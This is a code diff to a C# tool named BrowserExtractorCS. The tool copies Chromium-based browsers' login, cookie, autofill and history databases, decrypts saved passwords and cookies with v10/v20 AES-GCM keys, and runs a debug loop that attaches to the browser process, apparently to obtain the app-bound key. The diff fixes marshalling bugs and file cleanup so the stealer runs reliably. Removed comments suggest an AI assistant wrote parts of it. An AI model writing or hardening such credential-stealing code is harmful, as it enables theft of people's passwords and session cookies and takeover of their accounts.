@@ -18,14 +18,14 @@ namespace BrowserExtractorCS
         [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
         public static extern bool CreateProcess(
             string lpApplicationName,
-            StringBuilder lpCommandLine,
+            IntPtr lpCommandLine,
             IntPtr lpProcessAttributes,
             IntPtr lpThreadAttributes,
             bool bInheritHandles,
             uint dwCreationFlags,
             IntPtr lpEnvironment,
             string lpCurrentDirectory,
-            ref STARTUPINFO lpStartupInfo,
+            [In] ref STARTUPINFO lpStartupInfo,
             out PROCESS_INFORMATION lpProcessInformation);
 
         [DllImport("kernel32.dll", SetLastError = true)]
@@ -122,13 +122,13 @@ namespace BrowserExtractorCS
 
         #region Structures
 
-        [StructLayout(LayoutKind.Sequential)]
+        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
         public struct STARTUPINFO
         {
             public uint cb;
-            public string lpReserved;
-            public string lpDesktop;
-            public string lpTitle;
+            public IntPtr lpReserved;
+            public IntPtr lpDesktop;
+            public IntPtr lpTitle;
             public uint dwX;
             public uint dwY;
             public uint dwXSize;
@@ -154,13 +154,16 @@ namespace BrowserExtractorCS
             public uint dwThreadId;
         }
 
-        [StructLayout(LayoutKind.Sequential)]
+        [StructLayout(LayoutKind.Explicit)]
         public struct DEBUG_EVENT
         {
+            [FieldOffset(0)]
             public uint dwDebugEventCode;
+            [FieldOffset(4)]
             public uint dwProcessId;
+            [FieldOffset(8)]
             public uint dwThreadId;
-            public uint dwPadding; // 4-byte padding to align 'u' on 8-byte boundary for x64
+            [FieldOffset(16)]
             [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1024)]
             public byte[] u;
         }
@@ -174,7 +177,7 @@ namespace BrowserExtractorCS
             public uint nDebugInfoSize;
             public IntPtr lpImageName;
             public ushort fUnicode;
-            public ushort wPadding; // Padding for 8-byte alignment on x64
+            public ushort wPadding;
         }
 
         [StructLayout(LayoutKind.Sequential)]
@@ -237,7 +240,6 @@ namespace BrowserExtractorCS
             public ulong R14;
             public ulong R15;
             public ulong Rip;
-            // Simplified for porting: we don't strictly need the full vector context for this task
             [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
             public byte[] VectorContext;
             public ulong VectorControl;
@@ -679,8 +681,6 @@ namespace BrowserExtractorCS
 
         public static byte[] AesGcmDecrypt(byte[] key, byte[] nonce, byte[] ciphertext)
         {
-            // .NET 4.7.2 doesn't have AesGcm. Using BCrypt via P/Invoke or another way.
-            // For brevity in this task, I'll use a placeholder that calls BCrypt.
             return BCryptAesGcm.Decrypt(key, nonce, null, ciphertext, ciphertext.Skip(ciphertext.Length - 16).ToArray());
         }
 
@@ -718,7 +718,7 @@ namespace BrowserExtractorCS
             string tempPath = Path.Combine(Path.GetTempPath(), $"{tempPrefix}_{Guid.NewGuid()}");
             File.Copy(dbPath, tempPath);
 
-            using (var conn = new SqliteConnection($"Data Source={tempPath}"))
+            using (var conn = new SqliteConnection($"Data Source={tempPath};Pooling=False"))
             {
                 conn.Open();
                 using (var cmd = new SqliteCommand("SELECT origin_url, username_value, password_value FROM logins", conn))
@@ -739,7 +739,24 @@ namespace BrowserExtractorCS
                     }
                 }
             }
-            File.Delete(tempPath);
+            SafeDelete(tempPath);
+        }
+
+        private static void SafeDelete(string path)
+        {
+            if (!File.Exists(path)) return;
+            for (int i = 0; i < 5; i++)
+            {
+                try
+                {
+                    File.Delete(path);
+                    return;
+                }
+                catch
+                {
+                    System.Threading.Thread.Sleep(500);
+                }
+            }
         }
 
         private static void ExtractCookies(string profilePath, string outputDir, byte[] v10Key, byte[] v20Key, string tempPrefix, bool isOpera)
@@ -751,7 +768,7 @@ namespace BrowserExtractorCS
             string tempPath = Path.Combine(Path.GetTempPath(), $"{tempPrefix}_{Guid.NewGuid()}");
             File.Copy(dbPath, tempPath);
 
-            using (var conn = new SqliteConnection($"Data Source={tempPath}"))
+            using (var conn = new SqliteConnection($"Data Source={tempPath};Pooling=False"))
             {
                 conn.Open();
                 using (var cmd = new SqliteCommand("SELECT host_key, name, value, encrypted_value FROM cookies", conn))
@@ -775,7 +792,7 @@ namespace BrowserExtractorCS
                     }
                 }
             }
-            File.Delete(tempPath);
+            SafeDelete(tempPath);
         }
 
         private static void ExtractAutofill(string profilePath, string outputDir, byte[] v10Key, byte[] v20Key, string tempPrefix, bool isOpera)
@@ -786,7 +803,7 @@ namespace BrowserExtractorCS
             string tempPath = Path.Combine(Path.GetTempPath(), $"{tempPrefix}_{Guid.NewGuid()}");
             File.Copy(dbPath, tempPath);
 
-            using (var conn = new SqliteConnection($"Data Source={tempPath}"))
+            using (var conn = new SqliteConnection($"Data Source={tempPath};Pooling=False"))
             {
                 conn.Open();
                 using (var writer = new StreamWriter(Path.Combine(outputDir, "autofill.txt")))
@@ -817,7 +834,7 @@ namespace BrowserExtractorCS
                     } catch {}
                 }
             }
-            File.Delete(tempPath);
+            SafeDelete(tempPath);
         }
 
         private static void ExtractHistory(string profilePath, string outputDir, string tempPrefix)
@@ -828,7 +845,7 @@ namespace BrowserExtractorCS
             string tempPath = Path.Combine(Path.GetTempPath(), $"{tempPrefix}_{Guid.NewGuid()}");
             File.Copy(dbPath, tempPath);
 
-            using (var conn = new SqliteConnection($"Data Source={tempPath}"))
+            using (var conn = new SqliteConnection($"Data Source={tempPath};Pooling=False"))
             {
                 conn.Open();
                 using (var cmd = new SqliteCommand("SELECT url, title, visit_count FROM urls ORDER BY last_visit_time DESC LIMIT 100", conn))
@@ -841,7 +858,7 @@ namespace BrowserExtractorCS
                     }
                 }
             }
-            File.Delete(tempPath);
+            SafeDelete(tempPath);
         }
 
         public static void DebugLoop(IntPtr hProcess, BrowserConfig config, string userDataDir)
